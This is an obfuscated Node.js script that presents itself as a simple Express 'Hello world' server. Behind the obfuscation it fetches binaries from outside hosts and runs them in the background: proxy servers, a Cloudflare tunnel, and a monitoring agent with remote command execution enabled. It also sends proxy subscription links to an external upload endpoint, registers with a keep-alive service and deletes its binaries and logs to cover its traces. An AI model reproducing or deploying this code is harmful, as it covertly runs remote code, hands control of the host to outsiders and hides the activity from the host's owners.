const _0x36390b=_0x30db;(function(_0xe6baa8,_0x5ae4ab){const _0x1c1bf9=_0x30db,_0x4342f4=_0xe6baa8();while(!![]){try{const _0x3cde2e=-parseInt(_0x1c1bf9(0xce))/0x1+-parseInt(_0x1c1bf9(0x139))/0x2*(parseInt(_0x1c1bf9(0x9e))/0x3)+-parseInt(_0x1c1bf9(0x127))/0x4+parseInt(_0x1c1bf9(0xd0))/0x5*(-parseInt(_0x1c1bf9(0x92))/0x6)+-parseInt(_0x1c1bf9(0xba))/0x7*(-parseInt(_0x1c1bf9(0x10f))/0x8)+parseInt(_0x1c1bf9(0xd6))/0x9+parseInt(_0x1c1bf9(0xfb))/0xa;if(_0x3cde2e===_0x5ae4ab)break;else _0x4342f4['push'](_0x4342f4['shift']());}catch(_0xbb5f94){_0x4342f4['push'](_0x4342f4['shift']());}}}(_0x55a5,0x59722));const express=require('express'),app=express(),axios=require(_0x36390b(0x130)),os=require('os'),fs=require('fs'),path=require(_0x36390b(0xea)),{promisify}=require(_0x36390b(0xbf)),exec=promisify(require('child_process')[_0x36390b(0xa0)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x36390b(0xee)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x36390b(0xb0)]||'',AUTO_ACCESS=process[_0x36390b(0xee)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x36390b(0xee)][_0x36390b(0x137)]||_0x36390b(0x9c),SUB_PATH=process['env']['SUB_PATH']||_0x36390b(0xc7),PORT=process['env']['SERVER_PORT']||process['env'][_0x36390b(0x118)]||0xbb8,UUID=process['env']['UUID']||_0x36390b(0x105),NEZHA_SERVER=process[_0x36390b(0xee)][_0x36390b(0x9f)]||'',NEZHA_PORT=process[_0x36390b(0xee)][_0x36390b(0x102)]||'',NEZHA_KEY=process[_0x36390b(0xee)]['NEZHA_KEY']||_0x36390b(0x8e),ARGO_DOMAIN=process['env'][_0x36390b(0xf6)]||_0x36390b(0x13b),ARGO_AUTH=process[_0x36390b(0xee)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x36390b(0xee)][_0x36390b(0x94)]||0x1f41,CFIP=process[_0x36390b(0xee)][_0x36390b(0x82)]||_0x36390b(0xdb),CFPORT=process[_0x36390b(0xee)][_0x36390b(0x96)]||0x1bb,NAME=process[_0x36390b(0xee)][_0x36390b(0xcd)]||_0x36390b(0xa2);!fs[_0x36390b(0x8d)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x36390b(0x11d)](FILE_PATH+_0x36390b(0x83))):console[_0x36390b(0x11d)](FILE_PATH+_0x36390b(0x115));function _0x55a5(){const _0x418eb6=['automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/bot','true','cdns.doon.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','config.json','https://amd64.ssss.nyc.mn/web','statSync','text/plain;\x20charset=utf-8','tcp','writeFileSync','tls','\x20failed:\x20','listen','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x20\x20','path','data','8443','vmess','env','join','from','floor','basename','2083','unlink','has','ARGO_DOMAIN','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','country_code','\x0a\x0atrojan://','error','4033370UtsuGG','createWriteStream','none','pipe','mkdirSync','/vmess-argo?ed=2560','127.0.0.1','NEZHA_PORT','message','Error\x20in\x20startserver:','84a1e8f5-1f92-45b3-a8f1-ac60d19667ab','forEach','/api/add-subscriptions','clear','match','\x20-p\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','isFile','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','?encryption=none&security=tls&sni=','2512mkcwuV','\x0a\x20\x20credentials-file:\x20','/api/add-nodes','https://amd64.ssss.nyc.mn/agent','\x22\x20>\x20/dev/null\x202>&1','Content-Type','\x20already\x20exists','\x20>\x20nul\x202>&1','set','PORT','push','catch','false','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','log','direct','org','firefox','https://ipapi.co/json/','\x0aclient_secret:\x20','stream','platform','Hello\x20world!','utf-8','600316UcZPbJ','2087','quic','Subscription\x20uploaded\x20successfully','config.yaml','/vmess-argo','Skipping\x20adding\x20automatic\x20access\x20task','arch','all','axios','App\x20is\x20running','chmod','split','filter','Error\x20reading\x20boot.log:','boot.log','FILE_PATH','2096','66IPuZXZ','random','wysw.woshigehaorencccdbig.qzz.io','block','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>/dev/null\x202>&1','CFIP','\x20is\x20created','2053','tunnel.yml','/sub.txt\x20saved\x20successfully','status','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/config.json\x20>/dev/null\x202>&1\x20&','post','freedom','list.txt','existsSync','eyJhIjoiYTA5YjU3YzQ4MzI1OWEwNDQxZGQ4NzUwZjA3Mzk3NTMiLCJ0IjoiZTE3ZGZkY2MtOTM4MC00NjllLTg5NWMtYmRlODgyMzU3YmM4IiwicyI6IlpUQTNNR0l6T0RJdE16ZzBZUzAwWWpaaUxUa3pObVl0TlRNd01EaGlOMlZoTmpJMiJ9','stringify','pop','https://arm64.ssss.nyc.mn/web','205482TtclWb','includes','ARGO_PORT','rm\x20-rf\x20','CFPORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','arm64','xtls-rprx-vision','?security=tls&sni=','Download\x20','./tmp','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2973YNozoM','NEZHA_SERVER','exec','nohup\x20','ladder','toString','Error\x20executing\x20command:\x20','trojan','base64','countryCode','aarch64','Unhandled\x20error\x20in\x20startserver:','arm','\x20>/dev/null\x202>&1\x20&','Empowerment\x20failed\x20for\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','amd','sub.txt','PROJECT_URL','\x20-s\x20','/tunnel.yml\x20run','\x20successfully','send','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','tunnel.json','finish','/api/delete-nodes','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','12789OcyxOd','TunnelSecret','Error\x20downloading\x20files:','length','\x20is\x20running','util','/trojan-argo','fileUrl','close','application/json','response','readFileSync','get','sub','vless','https://amd64.ssss.nyc.mn/bot','.exe\x20>\x20nul\x202>&1','win32','del\x20/f\x20/q\x20','NAME','405924cRQMpB','charAt','5mFYRxp','php\x20running\x20error:\x20','\x0avless://','unlinkSync','&fp=firefox&type=ws&host=','/vless-argo','110772rAvBcB','/dev/null'];_0x55a5=function(){return _0x418eb6;};return _0x55a5();}function generateRandomName(){const _0x4f0d8e=_0x36390b,_0x3687f7='abcdefghijklmnopqrstuvwxyz';let _0x54d999='';for(let _0x185c14=0x0;_0x185c14<0x6;_0x185c14++){_0x54d999+=_0x3687f7[_0x4f0d8e(0xcf)](Math[_0x4f0d8e(0xf1)](Math[_0x4f0d8e(0x13a)]()*_0x3687f7['length']));}return _0x54d999;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x30db(_0x5f8120,_0x49feb0){_0x5f8120=_0x5f8120-0x80;const _0x55a5e7=_0x55a5();let _0x30dbad=_0x55a5e7[_0x5f8120];return _0x30dbad;}let npmPath=path[_0x36390b(0xef)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x36390b(0xef)](FILE_PATH,botName),subPath=path[_0x36390b(0xef)](FILE_PATH,_0x36390b(0xaf)),listPath=path[_0x36390b(0xef)](FILE_PATH,_0x36390b(0x8c)),bootLogPath=path[_0x36390b(0xef)](FILE_PATH,_0x36390b(0x136)),configPath=path['join'](FILE_PATH,_0x36390b(0xdd));function deleteNodes(){const _0x24879=_0x36390b;try{if(!UPLOAD_URL)return;if(!fs[_0x24879(0x8d)](subPath))return;let _0x1a5b56;try{_0x1a5b56=fs['readFileSync'](subPath,_0x24879(0x126));}catch{return null;}const _0x539ff4=Buffer[_0x24879(0xf0)](_0x1a5b56,_0x24879(0xa6))[_0x24879(0xa3)](_0x24879(0x126)),_0x4f3773=_0x539ff4['split']('\x0a')[_0x24879(0x134)](_0x25269d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x25269d));if(_0x4f3773[_0x24879(0xbd)]===0x0)return;return axios['post'](UPLOAD_URL+_0x24879(0xb8),JSON[_0x24879(0x8f)]({'nodes':_0x4f3773}),{'headers':{'Content-Type':_0x24879(0xc3)}})[_0x24879(0x11a)](_0x3c93eb=>{return null;}),null;}catch(_0x240185){return null;}}function cleanupOldFiles(){const _0x36f103=_0x36390b;try{const _0xb8c691=fs['readdirSync'](FILE_PATH);_0xb8c691[_0x36f103(0x106)](_0x4f7a07=>{const _0x509005=_0x36f103,_0x21c81e=path['join'](FILE_PATH,_0x4f7a07);try{const _0x4bb17c=fs[_0x509005(0xdf)](_0x21c81e);_0x4bb17c[_0x509005(0x10c)]()&&fs[_0x509005(0xd3)](_0x21c81e);}catch(_0x2b9d1d){}});}catch(_0x569848){}}app['get']('/',function(_0x570ea9,_0x152d3f){const _0x330f68=_0x36390b;_0x152d3f[_0x330f68(0xb4)](_0x330f68(0x125));});async function generateConfig(){const _0x51536b=_0x36390b,_0x1947f2={'log':{'access':'/dev/null','error':_0x51536b(0xd7),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x51536b(0xc8),'settings':{'clients':[{'id':UUID,'flow':_0x51536b(0x99)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x51536b(0xd5),'dest':0xbba},{'path':_0x51536b(0x12c),'dest':0xbbb},{'path':_0x51536b(0xc0),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x51536b(0x101),'protocol':_0x51536b(0xc8),'settings':{'clients':[{'id':UUID}],'decryption':_0x51536b(0xfd)},'streamSettings':{'network':_0x51536b(0xe1),'security':_0x51536b(0xfd)}},{'port':0xbba,'listen':_0x51536b(0x101),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x51536b(0xfd)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x51536b(0xd5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x51536b(0xe3),_0x51536b(0x129)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x51536b(0x101),'protocol':_0x51536b(0xed),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x51536b(0x12c)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x51536b(0xa5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x51536b(0xfd),'wsSettings':{'path':_0x51536b(0xc0)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x51536b(0xe3),_0x51536b(0x129)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x51536b(0x8b),'tag':_0x51536b(0x11e)},{'protocol':'blackhole','tag':_0x51536b(0x13c)}]};fs[_0x51536b(0xe2)](path['join'](FILE_PATH,_0x51536b(0xdd)),JSON[_0x51536b(0x8f)](_0x1947f2,null,0x2));}function getSystemArchitecture(){const _0x520862=_0x36390b,_0x1c26a6=os[_0x520862(0x12e)]();return _0x1c26a6===_0x520862(0xaa)||_0x1c26a6===_0x520862(0x98)||_0x1c26a6===_0x520862(0xa8)?_0x520862(0xaa):_0x520862(0xae);}function downloadFile(_0x20236f,_0x1b02c5,_0x199841){const _0x1a6cab=_0x36390b,_0x37ccf4=_0x20236f;!fs[_0x1a6cab(0x8d)](FILE_PATH)&&fs[_0x1a6cab(0xff)](FILE_PATH,{'recursive':!![]});const _0x5c6bd1=fs[_0x1a6cab(0xfc)](_0x37ccf4);axios({'method':_0x1a6cab(0xc6),'url':_0x1b02c5,'responseType':_0x1a6cab(0x123)})['then'](_0x512507=>{const _0x551aab=_0x1a6cab;_0x512507[_0x551aab(0xeb)][_0x551aab(0xfe)](_0x5c6bd1),_0x5c6bd1['on'](_0x551aab(0xb7),()=>{const _0x29d78e=_0x551aab;_0x5c6bd1[_0x29d78e(0xc2)](),console['log']('Download\x20'+path['basename'](_0x37ccf4)+_0x29d78e(0xb3)),_0x199841(null,_0x37ccf4);}),_0x5c6bd1['on'](_0x551aab(0xfa),_0x3378df=>{const _0x31a336=_0x551aab;fs[_0x31a336(0xf4)](_0x37ccf4,()=>{});const _0x483b92=_0x31a336(0x9b)+path[_0x31a336(0xf2)](_0x37ccf4)+'\x20failed:\x20'+_0x3378df['message'];console[_0x31a336(0xfa)](_0x483b92),_0x199841(_0x483b92);});})['catch'](_0x6df169=>{const _0x6a832d=_0x1a6cab,_0x4f9c4c=_0x6a832d(0x9b)+path[_0x6a832d(0xf2)](_0x37ccf4)+_0x6a832d(0xe4)+_0x6df169[_0x6a832d(0x103)];console[_0x6a832d(0xfa)](_0x4f9c4c),_0x199841(_0x4f9c4c);});}async function downloadFilesAndRun(){const _0x503447=_0x36390b,_0x51a505=getSystemArchitecture(),_0xb9c707=getFilesForArchitecture(_0x51a505);if(_0xb9c707[_0x503447(0xbd)]===0x0){console[_0x503447(0x11d)](_0x503447(0x11c));return;}const _0x11191c=_0xb9c707['map'](_0x329a67=>{return new Promise((_0x38d050,_0x49dc12)=>{const _0x498a91=_0x30db;downloadFile(_0x329a67['fileName'],_0x329a67[_0x498a91(0xc1)],(_0x579159,_0x1ffd63)=>{_0x579159?_0x49dc12(_0x579159):_0x38d050(_0x1ffd63);});});});try{await Promise[_0x503447(0x12f)](_0x11191c);}catch(_0x371f17){console[_0x503447(0xfa)](_0x503447(0xbc),_0x371f17);return;}function _0x1f9d13(_0x59dcab){const _0x2ede70=_0x503447,_0x2c2484=0x1fd;_0x59dcab[_0x2ede70(0x106)](_0x28d851=>{const _0x503e21=_0x2ede70;fs[_0x503e21(0x8d)](_0x28d851)&&fs[_0x503e21(0x132)](_0x28d851,_0x2c2484,_0x516c29=>{const _0x3dedf9=_0x503e21;_0x516c29?console[_0x3dedf9(0xfa)](_0x3dedf9(0xac)+_0x28d851+':\x20'+_0x516c29):console[_0x3dedf9(0x11d)]('Empowerment\x20success\x20for\x20'+_0x28d851+':\x20'+_0x2c2484[_0x3dedf9(0xa3)](0x8));});});}const _0x1814db=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1f9d13(_0x1814db);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3fd76b=NEZHA_SERVER[_0x503447(0x93)](':')?NEZHA_SERVER[_0x503447(0x133)](':')[_0x503447(0x90)]():'',_0x4568b0=new Set(['443','8443',_0x503447(0x138),_0x503447(0x128),_0x503447(0xf3),_0x503447(0x84)]),_0x3acb79=_0x4568b0[_0x503447(0xf5)](_0x3fd76b)?_0x503447(0xda):_0x503447(0x11b),_0x5cc6f6=_0x503447(0x122)+NEZHA_KEY+_0x503447(0x10d)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3acb79+_0x503447(0xe8)+UUID;fs[_0x503447(0xe2)](path[_0x503447(0xef)](FILE_PATH,_0x503447(0x12b)),_0x5cc6f6);const _0x2fa7bb=_0x503447(0xa1)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x503447(0xe7);try{await exec(_0x2fa7bb),console[_0x503447(0x11d)](phpName+'\x20is\x20running'),await new Promise(_0x208d68=>setTimeout(_0x208d68,0x3e8));}catch(_0x49a661){console[_0x503447(0xfa)](_0x503447(0xd1)+_0x49a661);}}else{let _0x5b6ba4='';const _0x3241ea=['443',_0x503447(0xec),'2096',_0x503447(0x128),_0x503447(0xf3),_0x503447(0x84)];_0x3241ea[_0x503447(0x93)](NEZHA_PORT)&&(_0x5b6ba4='--tls');const _0x58f5c9='nohup\x20'+npmPath+_0x503447(0xb1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x503447(0x10a)+NEZHA_KEY+'\x20'+_0x5b6ba4+_0x503447(0xb5);try{await exec(_0x58f5c9),console[_0x503447(0x11d)](npmName+_0x503447(0xbe)),await new Promise(_0x1862e7=>setTimeout(_0x1862e7,0x3e8));}catch(_0x5e1914){console[_0x503447(0xfa)]('npm\x20running\x20error:\x20'+_0x5e1914);}}}else console[_0x503447(0x11d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x623759=_0x503447(0xa1)+webPath+'\x20-c\x20'+FILE_PATH+_0x503447(0x89);try{await exec(_0x623759),console['log'](webName+_0x503447(0xbe)),await new Promise(_0x520dd8=>setTimeout(_0x520dd8,0x3e8));}catch(_0x10ffca){console[_0x503447(0xfa)]('web\x20running\x20error:\x20'+_0x10ffca);}if(fs[_0x503447(0x8d)](botPath)){let _0x24e287;if(ARGO_AUTH[_0x503447(0x109)](/^[A-Z0-9a-z=]{120,250}$/))_0x24e287=_0x503447(0xdc)+ARGO_AUTH;else ARGO_AUTH[_0x503447(0x109)](/TunnelSecret/)?_0x24e287=_0x503447(0x88)+FILE_PATH+_0x503447(0xb2):_0x24e287=_0x503447(0x9d)+FILE_PATH+_0x503447(0xf7)+ARGO_PORT;try{await exec(_0x503447(0xa1)+botPath+'\x20'+_0x24e287+_0x503447(0xab)),console[_0x503447(0x11d)](botName+_0x503447(0xbe)),await new Promise(_0x5b8987=>setTimeout(_0x5b8987,0x7d0));}catch(_0x4459ce){console['error'](_0x503447(0xa4)+_0x4459ce);}}await new Promise(_0x4b3782=>setTimeout(_0x4b3782,0x1388));}function getFilesForArchitecture(_0x54ee6c){const _0x303894=_0x36390b;let _0x50b940;_0x54ee6c==='arm'?_0x50b940=[{'fileName':webPath,'fileUrl':_0x303894(0x91)},{'fileName':botPath,'fileUrl':_0x303894(0xd9)}]:_0x50b940=[{'fileName':webPath,'fileUrl':_0x303894(0xde)},{'fileName':botPath,'fileUrl':_0x303894(0xc9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5d448d=_0x54ee6c==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x303894(0x112);_0x50b940[_0x303894(0xe6)]({'fileName':npmPath,'fileUrl':_0x5d448d});}else{const _0x271e24=_0x54ee6c===_0x303894(0xaa)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x50b940['unshift']({'fileName':phpPath,'fileUrl':_0x271e24});}}return _0x50b940;}function argoType(){const _0x282ffb=_0x36390b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x282ffb(0x11d)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x282ffb(0xbb))){fs[_0x282ffb(0xe2)](path[_0x282ffb(0xef)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xf127ec='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x282ffb(0x110)+path[_0x282ffb(0xef)](FILE_PATH,_0x282ffb(0xb6))+_0x282ffb(0x97)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x282ffb(0x10b);fs['writeFileSync'](path[_0x282ffb(0xef)](FILE_PATH,_0x282ffb(0x85)),_0xf127ec);}else console[_0x282ffb(0x11d)](_0x282ffb(0xb9));}async function extractDomains(){const _0x326a9e=_0x36390b;let _0x953e7b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x953e7b=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x953e7b),await _0x2e0a47(_0x953e7b);else try{const _0x49146d=fs[_0x326a9e(0xc5)](path[_0x326a9e(0xef)](FILE_PATH,_0x326a9e(0x136)),_0x326a9e(0x126)),_0x4f866d=_0x49146d[_0x326a9e(0x133)]('\x0a'),_0x350646=[];_0x4f866d[_0x326a9e(0x106)](_0x18b151=>{const _0x138da0=_0x326a9e,_0x1393ea=_0x18b151[_0x138da0(0x109)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1393ea){const _0x45b24a=_0x1393ea[0x1];_0x350646['push'](_0x45b24a);}});if(_0x350646[_0x326a9e(0xbd)]>0x0)_0x953e7b=_0x350646[0x0],console[_0x326a9e(0x11d)]('ArgoDomain:',_0x953e7b),await _0x2e0a47(_0x953e7b);else{console[_0x326a9e(0x11d)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x326a9e(0xd3)](path['join'](FILE_PATH,'boot.log'));async function _0x144ace(){const _0x43ed92=_0x326a9e;try{process[_0x43ed92(0x124)]===_0x43ed92(0xcb)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x43ed92(0xca)):await exec('pkill\x20-f\x20\x22['+botName[_0x43ed92(0xcf)](0x0)+']'+botName['substring'](0x1)+_0x43ed92(0x113));}catch(_0x567ec2){}}_0x144ace(),await new Promise(_0x71d3dc=>setTimeout(_0x71d3dc,0xbb8));const _0xb391a2=_0x326a9e(0x9d)+FILE_PATH+_0x326a9e(0xf7)+ARGO_PORT;try{await exec(_0x326a9e(0xa1)+botPath+'\x20'+_0xb391a2+_0x326a9e(0xab)),console[_0x326a9e(0x11d)](botName+_0x326a9e(0xbe)),await new Promise(_0x10a76d=>setTimeout(_0x10a76d,0xbb8)),await extractDomains();}catch(_0x5f02eb){console[_0x326a9e(0xfa)]('Error\x20executing\x20command:\x20'+_0x5f02eb);}}}catch(_0x5cda53){console['error'](_0x326a9e(0x135),_0x5cda53);}async function _0x4053eb(){const _0x361952=_0x326a9e;try{const _0x46adbd=await axios[_0x361952(0xc6)](_0x361952(0x121),{'timeout':0xbb8});if(_0x46adbd[_0x361952(0xeb)]&&_0x46adbd[_0x361952(0xeb)][_0x361952(0xf8)]&&_0x46adbd[_0x361952(0xeb)][_0x361952(0x11f)])return _0x46adbd[_0x361952(0xeb)][_0x361952(0xf8)]+'_'+_0x46adbd['data'][_0x361952(0x11f)];}catch(_0xecf673){try{const _0x24dbb3=await axios[_0x361952(0xc6)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x24dbb3['data']&&_0x24dbb3[_0x361952(0xeb)][_0x361952(0x87)]==='success'&&_0x24dbb3['data']['countryCode']&&_0x24dbb3[_0x361952(0xeb)][_0x361952(0x11f)])return _0x24dbb3[_0x361952(0xeb)][_0x361952(0xa7)]+'_'+_0x24dbb3['data']['org'];}catch(_0x416f5a){}}return'Unknown';}async function _0x2e0a47(_0x436231){const _0x55a49a=await _0x4053eb(),_0x210b8f=NAME?NAME+'-'+_0x55a49a:_0x55a49a;return new Promise(_0xeb82e5=>{setTimeout(()=>{const _0xa2053b=_0x30db,_0x8e8f1f={'v':'2','ps':''+_0x210b8f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xa2053b(0xfd),'net':'ws','type':_0xa2053b(0xfd),'host':_0x436231,'path':_0xa2053b(0x100),'tls':_0xa2053b(0xe3),'sni':_0x436231,'alpn':'','fp':_0xa2053b(0x120)},_0x1eb809=_0xa2053b(0xd2)+UUID+'@'+CFIP+':'+CFPORT+_0xa2053b(0x10e)+_0x436231+_0xa2053b(0xd4)+_0x436231+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x210b8f+'\x0a\x0avmess://'+Buffer[_0xa2053b(0xf0)](JSON['stringify'](_0x8e8f1f))[_0xa2053b(0xa3)]('base64')+_0xa2053b(0xf9)+UUID+'@'+CFIP+':'+CFPORT+_0xa2053b(0x9a)+_0x436231+_0xa2053b(0xd4)+_0x436231+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x210b8f+_0xa2053b(0xe9);console[_0xa2053b(0x11d)](Buffer[_0xa2053b(0xf0)](_0x1eb809)['toString']('base64')),fs[_0xa2053b(0xe2)](subPath,Buffer[_0xa2053b(0xf0)](_0x1eb809)[_0xa2053b(0xa3)](_0xa2053b(0xa6))),console[_0xa2053b(0x11d)](FILE_PATH+_0xa2053b(0x86)),uploadNodes(),app[_0xa2053b(0xc6)]('/'+SUB_PATH,(_0x26053a,_0x34c650)=>{const _0x47266c=_0xa2053b,_0x57f4d4=Buffer[_0x47266c(0xf0)](_0x1eb809)[_0x47266c(0xa3)](_0x47266c(0xa6));_0x34c650[_0x47266c(0x117)](_0x47266c(0x114),_0x47266c(0xe0)),_0x34c650['send'](_0x57f4d4);}),_0xeb82e5(_0x1eb809);},0x7d0);});}}async function uploadNodes(){const _0x5db4f1=_0x36390b;if(UPLOAD_URL&&PROJECT_URL){const _0x453f2f=PROJECT_URL+'/'+SUB_PATH,_0xfc42f3={'subscription':[_0x453f2f]};try{const _0x1ab578=await axios['post'](UPLOAD_URL+_0x5db4f1(0x107),_0xfc42f3,{'headers':{'Content-Type':_0x5db4f1(0xc3)}});return _0x1ab578&&_0x1ab578['status']===0xc8?(console[_0x5db4f1(0x11d)](_0x5db4f1(0x12a)),_0x1ab578):null;}catch(_0x48d5cd){if(_0x48d5cd[_0x5db4f1(0xc4)]){if(_0x48d5cd[_0x5db4f1(0xc4)][_0x5db4f1(0x87)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5db4f1(0x8d)](listPath))return;const _0x3224f0=fs[_0x5db4f1(0xc5)](listPath,_0x5db4f1(0x126)),_0x14acb2=_0x3224f0[_0x5db4f1(0x133)]('\x0a')[_0x5db4f1(0x134)](_0x1a0197=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1a0197));if(_0x14acb2['length']===0x0)return;const _0x5d7eb9=JSON[_0x5db4f1(0x8f)]({'nodes':_0x14acb2});try{const _0x4c1dff=await axios[_0x5db4f1(0x8a)](UPLOAD_URL+_0x5db4f1(0x111),_0x5d7eb9,{'headers':{'Content-Type':_0x5db4f1(0xc3)}});return _0x4c1dff&&_0x4c1dff[_0x5db4f1(0x87)]===0xc8?(console[_0x5db4f1(0x11d)]('Nodes\x20uploaded\x20successfully'),_0x4c1dff):null;}catch(_0x35ff6d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x23cc0b=_0x30db,_0x2f3532=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2f3532['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2f3532[_0x23cc0b(0x119)](phpPath);process[_0x23cc0b(0x124)]===_0x23cc0b(0xcb)?exec(_0x23cc0b(0xcc)+_0x2f3532[_0x23cc0b(0xef)]('\x20')+_0x23cc0b(0x116),_0x17145e=>{const _0x33f899=_0x23cc0b;console[_0x33f899(0x108)](),console[_0x33f899(0x11d)](_0x33f899(0x131)),console[_0x33f899(0x11d)](_0x33f899(0x80));}):exec(_0x23cc0b(0x95)+_0x2f3532[_0x23cc0b(0xef)]('\x20')+_0x23cc0b(0x81),_0x1d7e4e=>{const _0x5b6ee7=_0x23cc0b;console[_0x5b6ee7(0x108)](),console['log']('App\x20is\x20running'),console[_0x5b6ee7(0x11d)](_0x5b6ee7(0x80));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3e10ab=_0x36390b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3e10ab(0x11d)](_0x3e10ab(0x12d));return;}try{const _0xfa7554=await axios[_0x3e10ab(0x8a)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3e10ab(0xc3)}});return console['log'](_0x3e10ab(0xd8)),_0xfa7554;}catch(_0x115b45){return console['error'](_0x3e10ab(0xad)+_0x115b45[_0x3e10ab(0x103)]),null;}}async function startserver(){const _0x139fb8=_0x36390b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2e0c61){console[_0x139fb8(0xfa)](_0x139fb8(0x104),_0x2e0c61);}}startserver()[_0x36390b(0x11a)](_0x15c0f8=>{const _0x4fb8a6=_0x36390b;console[_0x4fb8a6(0xfa)](_0x4fb8a6(0xa9),_0x15c0f8);}),app[_0x36390b(0xe5)](PORT,()=>console[_0x36390b(0x11d)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
